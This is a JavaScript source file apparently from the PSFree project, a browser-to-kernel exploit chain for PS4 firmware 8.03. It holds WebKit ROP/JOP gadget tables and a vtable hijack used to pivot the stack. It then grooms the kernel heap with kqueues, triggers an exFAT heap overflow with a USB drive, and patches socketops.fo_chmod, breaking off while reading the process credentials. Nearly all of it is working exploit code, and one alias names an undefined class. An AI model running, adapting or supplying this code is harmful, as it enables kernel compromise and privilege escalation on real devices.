/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from '../config.mjs';

import { Int } from '../module/int64.mjs';
import { debug_log, die } from '../module/utils.mjs';
import { Addr, mem } from '../module/mem.mjs';
import { KB, MB } from '../module/constants.mjs';
import { ChainBase } from '../module/chain.mjs';

import {
    make_buffer,
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '../module/memtools.mjs';

import * as rw from '../module/rw.mjs';
import * as o from '../module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];

const offset_textarea_impl = 0x18;

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x8d8;
const offset_wk_strlen = 0x918;

// libSceLibcInternal offsets
const offset_libc_setjmp = 0x258f4;
const offset_libc_longjmp = 0x29c58;

// see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
//
// int setjmp(jmp_buf)
// noreturn longjmp(jmp_buf)
//
// This version of longjmp() does not take another argument to be used as
// setjmp()'s return value. Offset 0 of the jmp_buf will be the restored
// rax. Change it if you want a specific value from setjmp() after the
// longjmp().
const jmp_buf_size = 0xc8;
let setjmp_addr = null;
let longjmp_addr = null;

// libSceNKWebKit.sprx
let libwebkit_base = null;
// libkernel_web.sprx
let libkernel_base = null;
// libSceLibcInternal.sprx
let libc_base = null;
// kernel base address
let kbase = null;

const kjop1 = `
mov rdi, qword ptr [rdi]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0xe0]
`;
const k2jop1 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
// gadgets for the JOP chain
//
// When the scrollLeft getter native function is called on PS4 8.03, rsi is the
// JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x20]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x28]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
//
// jop1 pushed another object (via the call instruction) but we want no extra
// objects between the return address and the rbp that will be pushed by jop3
// later. So we pop the return address pushed by jop1.
//
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x5f]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop3 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop4 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop5 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop6 = 'pop rsp; ret';

// the ps4 firmware is compiled to use rbp as a frame pointer
//
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const rop_epilogue = 'leave; ret';

const push_rdx_jmp = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000035a1b,
    'pop rbx; ret' : 0x000000000001537c,
    'pop rcx; ret' : 0x0000000000025ecb,
    'pop rdx; ret' : 0x0000000000060f52,

    'pop rbp; ret' : 0x00000000000000b6,
    'pop rsi; ret' : 0x000000000003bd77,
    'pop rdi; ret' : 0x00000000001e3f87,
    'pop rsp; ret' : 0x00000000000bf669,

    'pop r8; ret' : 0x0000000000097442,
    'pop r9; ret' : 0x00000000006f501f,
    'pop r10; ret' : 0x0000000000060f51,
    'pop r11; ret' : 0x0000000000d2a629,

    'pop r12; ret' : 0x0000000000d8968d,
    'pop r13; ret' : 0x00000000016ccff1,
    'pop r14; ret' : 0x000000000003bd76,
    'pop r15; ret' : 0x00000000002499df,

    'ret' : 0x0000000000000032,
    'leave; ret' : 0x0000000000291fd7,
    'leave; jmp rcx' : 0x000000000062a061,

    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
    'adc esi, esi; ret' : 0x000000000088cbb9,
    'add rax, rdx; ret' : 0x00000000003cd92c,
    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,
    'add rax, 8; ret': 0x0000000000468988,

    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
    'mov dword ptr [rdi], eax; ret' : 0x000000000001f864,
    'mov rdx, rcx; ret' : 0x0000000000eae9fd,
    'mov qword ptr [rdx], rax; mov al, 1; ret' : 0x00000000000b6dcf,
    'mov rdx, qword ptr [rcx]; ret' : 0x0000000000182bc4,

    'cli; jmp qword ptr [rax + 0x43]' : 0x0000000002163442,
    'sti; ret' : 0x00000000004b94c8,
    'xchg rbp, rax; ret' : 0x000000000218ef60,

    [kjop1] : 0x00000000010da705,
    [k2jop1] : 0x0000000001988320,

    [push_rdx_jmp] : 0x00000000021af6ad,

    [jop1] : 0x000000000057d568,
    [jop2] : 0x0000000002198221,
    [jop3] : 0x000000000076b970,
    [jop4] : 0x0000000000202698,
    [jop5] : 0x00000000021af6ad,
    [jop6] : 0x00000000000bf669,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'neg rax; ret' : 0x00000000000d3503,
    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
    'setjmp' : offset_libc_setjmp,
    'longjmp' : offset_libc_longjmp,
}));

const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    const stack_chk_fail_import =
        libwebkit_base
        .add(offset_wk_stack_chk_fail)
    ;
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import);
    const libc_base = find_base(strlen_addr, true, true);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain800Base extends ChainBase {
    constructor() {
        super();

        // for conditional jumps
        this._clean_branch_ctx();
        this.flag = new Uint8Array(8);
        this.flag_addr = get_view_vector(this.flag);
        this.jmp_target = new Uint8Array(0x100);
        rw.write64(this.jmp_target, 0x50, this.get_gadget(push_rdx_jmp));
        rw.write64(this.jmp_target, 0, this.get_gadget('pop rsp; ret'));

        // for save/restore
        this.is_saved = false;
        const jmp_buf_size = 0xc8;
        this.jmp_buf = new Uint8Array(jmp_buf_size);
        this.jmp_buf_p = get_view_vector(this.jmp_buf);
    }

    push_write64(addr, value) {
        this.push_gadget('pop rdi; ret');
        this.push_value(addr);
        this.push_gadget('pop rsi; ret');
        this.push_value(value);
        this.push_gadget('mov qword ptr [rdi], rsi; ret');
    }

    // sequence to pivot back and return
    push_end() {
        this.push_gadget(rop_epilogue);
    }

    check_is_branching() {
        if (this.is_branch_ctx) {
            throw Error('chain is still branching, end it before running');
        }
    }

    push_value(value) {
        super.push_value(value);

        if (this.is_branch_ctx) {
            this.branch_position += 8;
        }
    }

    _clean_branch_ctx() {
        this.is_branch_ctx = false;
        this.branch_position = null;
        this.delta_slot = null;
        this.rsp_slot = null;
        this.rsp_position = null;
    }

    clean() {
        super.clean();
        this._clean_branch_ctx();
        this.is_saved = false;
    }

    // Use start_branch() and end_branch() to delimit a ROP chain that will
    // conditionally execute. rax must be set accordingly before the branch.
    // rax == 0 means execute the conditional chain.
    //
    // example that always execute the conditional chain:
    //     chain.push_gadget('mov rax, 0; ret');
    //     chain.start_branch();
    //     chain.push_gadget('pop rbx; ret'); // always executed
    //     chain.end_branch();
    start_branch() {
        if (this.is_branch_ctx) {
            throw Error('chain already branching, end it first');
        }

        // clobbers rax, rcx, rdi, rsi
        //
        // u64 flag = 0 if -rax == 0 else 1
        // *flag_addr = flag
        this.push_gadget('pop rcx; ret');
        this.push_constant(-1);
        this.push_gadget('neg rax; ret');
        this.push_gadget('pop rsi; ret');
        this.push_constant(0);
        this.push_gadget('adc esi, esi; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rsi; ret');

        // clobbers rax, rcx, rdi
        //
        // rax = *flag_addr
        // rcx = delta
        // rax = -rax & rcx
        // *flag_addr = rax
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // dummy value, overwritten later by end_branch()
        this.push_gadget('pop rcx; ret');
        this.delta_slot = this.position;
        this.push_constant(0);

        this.push_gadget('neg rax; and rax, rcx; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rax, rcx, rdx, rsi
        //
        // rcx = rsp_position
        // rsi = rsp
        // rcx += rsi
        // rdx = rcx
        //
        // dummy value, overwritten later at the end of start_branch()
        this.push_gadget('pop rcx; ret');
        this.rsp_slot = this.position;
        this.push_constant(0);

        this.push_gadget('pop rsi; ret');
        this.push_value(this.stack_addr.add(this.position + 8));

        // rsp collected here, start counting how much to perturb rsp
        this.branch_position = 0;
        this.is_branch_ctx = true;

        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
        this.push_gadget('mov rdx, rcx; ret');

        // clobbers rax
        //
        // rax = *flag_addr
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // clobbers rax
        //
        // rax += rdx
        // new_rsp = rax
        this.push_gadget('add rax, rdx; ret');

        // clobbers rdi
        //
        // for debugging, save new_rsp to flag_addr so we can verify it later
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rdx, rcx
        //
        // rdx = rax
        this.push_gadget('pop rcx; ret');
        this.push_constant(0);
        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');

        // clobbers rax, rdx, rdi, rsp
        //
        // rsp = rdx
        this.push_gadget('pop rax; ret');
        this.push_value(get_view_vector(this.jmp_target));
        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
        this.push_constant(0); // padding for the push

        this.rsp_position = this.branch_position;
        rw.write64(this.stack, this.rsp_slot, new Int(this.rsp_position));
    }

    end_branch() {
        if (!this.is_branch_ctx) {
            throw Error('can not end nonbranching chain');
        }

        const delta = this.branch_position - this.rsp_position;
        rw.write64(this.stack, this.delta_slot, new Int(delta));
        this._clean_branch_ctx();
    }

    // clobbers rax, rdi, rsi
    push_save() {
        if (this.is_saved) {
            throw Error('restore first before saving again');
        }
        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
        this.is_saved = true;
    }

    // Force a push_restore() if at runtime you can ensure the save/restore
    // pair line up.
    push_restore(is_force=false) {
        if (!this.is_saved && !is_force) {
            throw Error('save first before restoring');
        }
        // modify jmp_buf.rsp
        this.push_gadget('pop rax; ret');
        const rsp_slot = this.position;
        // dummy value, overwritten later at the end of push_restore()
        this.push_constant(0);
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x38));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // modify jmp_buf.return_address
        this.push_gadget('pop rax; ret');
        this.push_value(this.get_gadget('ret'));
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x80));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);

        // Padding as longjmp() pushes the rdi and return address in the
        // jmp_buf at the target rsp.
        this.push_constant(0);
        this.push_constant(0);
        const target_rsp = this.stack_addr.add(this.position);

        rw.write64(this.stack, rsp_slot, target_rsp);
        this.is_saved = false;
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    call(...args) {
        if (this.position !== 0) {
            throw Error('call() needs an empty chain');
        }
        this.push_call(...args);
        this.push_get_retval();
        this.push_end();
        this.run();
        this.clean();

        return this.return_value;
    }

    syscall(...args) {
        if (this.position !== 0) {
            throw Error('syscall() needs an empty chain');
        }
        this.push_syscall(...args);
        this.push_get_retval();
        this.push_end();
        this.run();
        this.clean();

        return this.return_value;
    }
}

// helper object for ROP
const rop_ta = document.createElement('textarea');

// Chain for PS4 8.03
class Chain800 extends Chain800Base {
    constructor() {
        super();

        // sizeof JSC:JSObject, the JSCell + the butterfly field
        const js_size = 0x10;
        // sizeof WebCore::JSHTMLTextAreaElement, subclass of JSObject
        const js_ta_size = 0x20;
        // start of the array of inline properties (JSValues)
        const offset_js_inline_prop = 0x10;
        // Sizes may vary between webkit versions so we just assume a size
        // that we think is large enough for all of them.
        const vtable_size = 0x1000;
        const webcore_ta_size = 0x180;

        // Empty objects have 6 inline properties that are not inspected by the
        // GC. This gives us 48 bytes of free space that we can write with
        // anything.
        const ta_clone = {};
        this.ta_clone = ta_clone;
        const clone_p = mem.addrof(ta_clone);
        const ta_p = mem.addrof(rop_ta);

        // Copy the contents of the textarea before copying the JSCell. As long
        // the JSCell is of an empty object, the GC will not inspect the inline
        // storage.
        //
        // MarkedBlocks serve memory in fixed-size chunks (cells). The chunk
        // size is also called the cell size. Even if you request memory whose
        // size is less than a cell, the entire cell is allocated for the
        // object.
        //
        // The cell size of the MarkedBlock where the empty object is allocated
        // is atleast 64 bytes (enough to fit the empty object). So even if we
        // change the JSCell later and the perceived size of the object
        // (js_ta_size) is less than 64 bytes, we don't have to worry about the
        // memory area between clone_p + js_ta_size and clone_p + cell_size
        // being freed and reused because the entire cell belongs to the object
        // until it dies.
        for (let i = js_size; i < js_ta_size; i += 8) {
            clone_p.write64(i, ta_p.read64(i));
        }

        // JSHTMLTextAreaElement is a subclass of JSC::JSDestructibleObject and
        // thus they are allocated on a MarkedBlock with special attributes
        // that tell the GC to have their destructor clean their storage on
        // their death.
        //
        // The destructor in this case will destroy m_wrapped since they are a
        // subclass of WebCore::JSDOMObject as well.
        //
        // What's great about the clones (initially empty objects) is that they
        // are instances of JSC::JSFinalObject. That type doesn't have a
        // destructor and so they are allocated on MarkedBlocks that don't need
        // destruction.
        //
        // So even if a clone dies, the GC will not look for a destructor and
        // try to run it. This means we can fake m_wrapped and not fear of any
        // sort of destructor being called on it.

        const webcore_ta = ta_p.readp(offset_textarea_impl);
        const m_wrapped_clone = new Uint8Array(
            make_buffer(webcore_ta, webcore_ta_size)
        );
        this.m_wrapped_clone = m_wrapped_clone;

        // Replicate the vtable as much as possible or else the garbage
        // collector will crash. It uses functions from the vtable.
        //
        // There is no need to restore the original vtable pointer later since
        // it points to a copy with only offset 0x1c8 changed. The scrollLeft
        // getter is not used by the GC.
        const vtable_clone = new Uint8Array(
            make_buffer(webcore_ta.readp(0), vtable_size)
        );
        this.vtable_clone = vtable_clone

        clone_p.write64(
            offset_textarea_impl,
            get_view_vector(m_wrapped_clone),
        );
        rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));

        // turn the empty object into a textarea (copy JSCell header)
        //
        // Don't need to copy the butterfly since it's by default NULL and it
        // doesn't have any special meaning for the JSHTMLTextAreaObject type,
        // unlike other types that uses it for something else.
        //
        // An example is a JSArrayBufferView with m_mode >= WastefulTypedArray,
        // their *(butterfly - 8) is a pointer to a JSC::ArrayBuffer.
        clone_p.write64(0, ta_p.read64(0));

        // 0x1c8 is the offset of the scrollLeft getter native function
        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));

        // for the JOP chain
        const rax_ptrs = new Uint8Array(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        this.rax_ptrs = rax_ptrs;

        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x5f, this.get_gadget(jop3));
        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
        // value to pivot rsp to
        rw.write64(rax_ptrs, 0x18, this.stack_addr);

        const jop_buffer = new Uint8Array(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        this.jop_buffer = jop_buffer;

        rw.write64(jop_buffer, 0, rax_ptrs_p);

        // Write the needed data by the JOP chain (mov rdi, qword ptr [rsi +
        // 0x20]) at offset 0x20 (3rd inline property of the empty object) from
        // the address of the cloned textarea.
        //
        // We could have passed the data by another offset like via the
        // m_classInfo field ([rsi + 0x10]) but the contents of a
        // JSHTMLTextAreaElement is not safe to change since it is used by the
        // GC. Even if we restore them immediately, there is a small time frame
        // where the GC could use the invalid contents.
        clone_p.write64(offset_js_inline_prop + 8*2, jop_buffer_p);
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this.check_is_branching();

        // jump to JOP chain
        this.ta_clone.scrollLeft;
    }
}
const Chain = Chain803;

function init(Chain) {
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
    debug_log('syscall_array:');
    debug_log(syscall_array);
    Chain.init_class(gadgets, syscall_array);
}

function test_rop(Chain) {
    const jmp_buf = new Uint8Array(jmp_buf_size);
    const jmp_buf_p = get_view_vector(jmp_buf);

    init(Chain);

    setjmp_addr = gadgets.get('setjmp');
    longjmp_addr = gadgets.get('longjmp');

    const chain = new Chain();
    // Instead of writing to the jmp_buf, set rax here so it will be restored
    // as the return value after the longjmp().
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);
    chain.push_call(setjmp_addr, jmp_buf_p);

    chain.start_branch();

    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_call(longjmp_addr, jmp_buf_p);

    chain.end_branch();

    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_end();

    // The ROP chain is a noop. If we crashed, then we did something wrong.
    alert('chain run');
    debug_log('test call setjmp()/longjmp()');
    chain.run()
    alert('returned successfully');
    debug_log('returned successfully');
    debug_log('jmp_buf:');
    debug_log(jmp_buf);
    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);

    const state1 = new Uint8Array(8);
    debug_log('test if rax == 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state1));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(0);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.run();
    debug_log(`state1 must be 1: ${state1}`);
    if (state1[0] !== 1) {
        die('if branch not taken');
    }

    const state2 = new Uint8Array(8);
    debug_log('test if rax != 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state2));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_end();

    chain.run();
    debug_log(`state2 must be 2: ${state2}`);
    if (state2[0] !== 2) {
        die('if branch taken');
    }

    debug_log('test syscall getuid()');
    chain.clean();
    // Set the return value to some random value. If the syscall worked, then
    // it will likely change.
    const magic = 0x4b435546;
    rw.write32(chain._return_value, 0, magic);

    const res = chain.syscall('getuid');

    debug_log(`return value: ${res}`);
    if (res.eq(magic)) {
        die('syscall getuid failed');
    }
}

function mlock_gadgets(gadgets) {
    const chain = new Chain();

    for (const [gadget, addr] of gadgets) {
        // change this if you use longer gadgets
        const max_gadget_length = 0x50;
        chain.push_syscall('mlock', addr, max_gadget_length);
    }
    chain.push_end();
    chain.run();
    chain.clean();
}

function mlock_kchain(kchain) {
    const chain = new Chain();
    const stack_buffer = kchain.stack_buffer;
    const stack_buffer_p = get_view_vector(new Uint8Array(stack_buffer));
    // have a view point to the buffer of stack_buffer
    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
}

// pivots back to the original kernel stack with interrupts enabled
function push_krop_end(kchain) {
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(kchain.get_gadget('sti; ret'));
    kchain.push_gadget('leave; jmp rcx');
}

// The initial kernel patch will be to modify socketops.fo_chmod so that we can
// run later kernel code via calling fchmod() on a socket descriptor.
function prepare_knote(kchain) {
    const chain = new Chain();
    const size = 0x4000;
    // PROT_READ | PROT_WRITE
    const prot_rw = 3;
    const MAP_ANON = 0x1000;
    const MAP_FIXED = 0x10;

    const mmap_area = new Addr(
        chain.syscall(
            'mmap',
            0x4000,
            size,
            prot_rw,
            MAP_ANON | MAP_FIXED,
            -1,
            0,
        )
    );

    const knote = mmap_area;

    debug_log(`knote addr: ${knote}`);
    if (!knote.eq(0x4000)) {
        die('mmap() failed');
    }

    const filterops = mmap_area.add(0x200);
    const jop_buffer = mmap_area.add(0x1000);
    const rax_ptrs = mmap_area.add(0x1008);
    // scratch area used later
    const scratch = mmap_area.add(0x2000);

    const offset_kn_fop = 0x68;
    knote.write64(0, jop_buffer);
    knote.write64(offset_kn_fop, filterops);

    const offset_f_detach = 0x10;
    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));

    jop_buffer.write64(0, rax_ptrs);

    // for the kernel JOP chain
    rax_ptrs.write64(0xe0, kchain.get_gadget(jop3));
    rax_ptrs.write64(0x30, kchain.get_gadget(jop4));
    rax_ptrs.write64(0x10, kchain.get_gadget(jop5));
    // We need to cli before the pivot (to a user mode rsp) and to sti after
    // the back pivot (the system needs to handle interrupts after all).
    //
    // Since ps4 5.00, a pseudo-SMAP mitigation has been employed. The thread
    // scheduler checks if the stack pointer of a kernel thread is pointing to
    // kernel memory, if not, crash the system.
    rax_ptrs.write64(0, kchain.get_gadget('cli; jmp qword ptr [rax + 0x43]'));
    rax_ptrs.write64(0x43, kchain.get_gadget(jop6));
    // value to pivot rsp to
    rax_ptrs.write64(0x18, kchain.stack_addr);

    // * there are 2 calls to f_detach() in kqueue_close()
    // * offset relative to the return address of the first f_detach()
    // * epi = address of the epilogue of kqueue_close()
    // kqueue_close() epilogue
    const offset_kqueue_close_epi = 689;
    // offset relative to epi
    const offset_socketops = 0x179f39f;

    // get kernel stack pointer
    kchain.push_gadget('xchg rbp, rax; ret');
    // ret_addr = *(rbp + 8)
    kchain.push_gadget('add rax, 8; ret');
    kchain.push_get_retval();
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
    // ret_addr += offset_kqueue_close_epi
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_kqueue_close_epi);
    kchain.push_gadget('add rax, rdx; ret');
    // modify return address to jump to the epilogue
    // *(rbp + 8) = ret_addr
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(kchain.retval_addr);
    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
    // save rax as it will get clobbered and we still need it
    // currently, rax = epi
    kchain.push_get_retval();
    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');

    // restore rbp
    kchain.push_gadget('pop rax; ret');
    kchain.push_constant(-8);
    kchain.push_gadget('add rax, rdx; ret');
    kchain.push_gadget('xchg rbp, rax; ret');

    // restore rax
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(kchain.retval_addr);
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');

    // socketops.fo_chmod = k2jop1
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_socketops + 0x40);
    kchain.push_gadget('add rax, rdx; ret');
    // also saves a kernel address (&socketops.fo_chmod)
    kchain.push_get_retval();
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(kchain.retval_addr);
    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(kchain.get_gadget(k2jop1));
    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');

    // We'll check address 0x4000 later as an additional test to see if the
    // kchain ran.
    kchain.push_gadget('pop rdi; ret');
    kchain.push_constant(0x4000);
    kchain.push_gadget('pop rsi; ret');
    kchain.push_constant('0xdeadbeefbeefdead');
    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');

    push_krop_end(kchain);

    chain.syscall('mlock', knote, size);

    // the mmaped area will be reused for the fchmod() kernel ROP chain
    return [mmap_area, size, jop_buffer, rax_ptrs, scratch];
}

// malloc/free until the heap is shaped in a certain way, such that the exFAT
// heap oveflow bug overwrites a struct klist
function trigger_oob(kchain) {
    const chain = new Chain();

    const num_kqueue = 0x1b0;
    const kqueues = new Uint32Array(num_kqueue);
    const kqueues_p = get_view_vector(kqueues);

    for (let i = 0; i < num_kqueue; i++) {
        chain.push_syscall('kqueue');
        chain.push_gadget('pop rdi; ret');
        chain.push_value(kqueues_p.add(i * 4));
        chain.push_gadget('mov dword ptr [rdi], eax; ret');
    }
    chain.push_end();
    chain.run();
    chain.clean();

    const AF_INET = 2;
    const SOCK_STREAM = 1;
    // socket file descriptor
    const sd = chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
    // We suspect why they want a specific file descriptor is because
    // kqueue_expand() allocates memory whose size depends on the file
    // descriptor number.
    //
    // The specific malloc size is probably a part in their method in shaping
    // the heap.
    //
    // socket() returns an int (32-bit signed integer)
    // if sd.high() !== 0, socket() returned an error
    if (sd.low() < 0x100 || sd.low() >= 0x200 || sd.high() !== 0) {
        die(`invalid socket: ${sd}`);
    }
    debug_log(`socket descriptor: ${sd}`);

    // spray kevents
    const kevent = new Uint8Array(0x20);
    const kevent_p = get_view_vector(kevent);
    kevent_p.write64(0, sd);
    // EV_ADD and EVFILT_READ
    kevent_p.write32(0x8, 0x1ffff);
    kevent_p.write32(0xc, 0);
    kevent_p.write64(0x10, Int.Zero);
    kevent_p.write64(0x18, Int.Zero);

    for (let i = 0; i < num_kqueue; i++) {
        // nchanges == 1, everything else is NULL/0
        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
    }
    chain.push_end();
    chain.run();
    chain.clean();

    // fragment memory
    for (let i = 18; i < num_kqueue; i += 2) {
        chain.push_syscall('close', kqueues[i]);
    }
    chain.push_end();
    chain.run();
    chain.clean();

    // trigger OOB
    alert('insert USB');

    // trigger corrupt knote
    for (let i = 1; i < num_kqueue; i += 2) {
        chain.push_syscall('close', kqueues[i]);
    }
    chain.push_end();
    chain.run();
    chain.clean();

    const kretval = kchain.return_value;
    debug_log(`kchain retval: ${kretval}`);
    debug_log(kchain.jmp_buf);
    debug_log(new Addr(0x4000).read64(0));
    if (!kretval.eq('0xdeadbeefbeefdead')) {
        die('heap overflow failed');
    }
    debug_log('kernel ROP chain ran successfully');
    kchain.clean();

    // reuse sd for the fchmod() kernel ROP chain
    return [sd, kretval];
}

// socketops.fo_chmod() was previously invfo_chmod(), which just returned
// EINVAL
function push_ret_einval(kchain) {
    const EINVAL = 22;
    kchain.push_gadget('pop rax; ret');
    kchain.push_constant(EINVAL);
}

function get_ucred_addr(kchain, sd, mmap_area) {
    const chain = new Chain();
    const offset_jmp_buf_rcx = 0x10;
    const offset_thread_td_proc = 8;
    const offset_proc_p_ucred = 0x40;

    // we enter fo_chmod with rcx containing the "struct thread td" argument
    kchain.push_save();

    // rax = td
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(kchain.jmp_buf_p);
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_jmp_buf_rcx);
    kchain.push_gadget('add rax, rdx; ret');
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
    // rax = td->td_proc
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_thread_td_proc);
    kchain.push_gadget('add rax, rdx; ret');
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
    // rax = td->td_proc->p_ucred
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(offset_proc_p_ucred);
    kchain.push_gadget('add rax, rdx; ret');
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');

